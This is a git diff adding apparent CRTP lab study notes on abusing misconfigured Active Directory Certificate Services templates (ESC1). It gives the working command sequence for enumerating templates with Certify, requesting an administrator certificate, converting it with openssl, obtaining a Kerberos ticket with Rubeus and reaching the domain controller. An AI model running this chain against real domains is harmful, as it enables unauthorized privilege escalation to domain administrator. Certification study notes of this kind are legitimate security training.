@@ -2491,3 +2491,75 @@ new view \\eurocorp-dc.eurocorp.local
 dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/f965943b-a0de-40ca-a601-83ffcac0e599)
+
+# ADCS-ESC1 (Active Directory Certificate Service)
+### Requirements
+1. `"msPKI-Certificate-Name-Flag"` must have the `"ENROLLEE_SUPPLIES_SUBJECT"` value
+2. `"Extended Key Usage"` must have one of the following options: PKINIT Client Authentication, Smart Card Logon, Any Purpose, or no EKU
+3. The group you are in must be in the `"Enrollment Right"`
+### Enumeration
+1. check if the environment using ADCS
+```
+Certify.exe cas
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/09ca977f-fb84-4978-be2c-abd83cb794ff)
+
+this is the first requirement. Normal users are allowed to enroll the ADCS
+
+2. Enumerate the templates
+```
+Certify.exe find
+Certify.exe find /enrolleeSuppliesSubject
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/99ca2d4a-f55d-4c1e-8051-e2ce1daa0879)
+
+3. Enumerate vulnerable templates
+```
+Certify.exe find /vulnerable
+```
+### Exploitation
+1. now we are going to abuse the Service Certificate. we will request HTTPS Certificate for the administrator user
+```
+Certifiy.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/6c39b525-bcda-4623-a6c9-4809a9ebfdfa)
+
+Note: you also can abuse the Service Certificate. we will request HTTPS Certificate for the forest root
+```
+Certifiy.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3bd7d457-cd9a-488e-b92d-0f9376b4d499)
+
+2. copy the certificate and save it in pem format
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/232e8980-bedc-4804-afe2-b9383203ec82)
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/10a0a94e-ba00-485d-8b58-e8ae73195a03)
+
+3. use openssl to convert to a PFX format so that we can use this with Rubues
+```
+openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d6f0c2be-35ec-43cf-9807-d0918212b1ff)
+
+you can specify any password. you will use the password in Rubues
+
+4. using Rubues we will request a TGT ticket for the user administrator using the certificate that we generated.
+```
+Rubues.exe asktgt /user:administrator /certificate:C:\AD\Tools\esc1-DA.pfx /password:SecretPass@123 /ptt
+```
+5. klist
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/602c86a5-8d3a-41ad-98b5-4439f7c70a8f)
+
+6. check if you can access the DC
+```
+winrs -r:dcorp-dc cmd /c set username
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/507f7b30-8f35-44f2-9407-e33def8929c6)
+
+### ADCS - ESC3
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/ff22e39b-272b-4162-b432-9b044489f1d4)
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/36c7dd3c-ed2b-4590-8200-f44d07eb2044)
+
+### ADCS - ESC6
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/bbdbb2bb-2506-4ad5-99a4-97da380a991f)
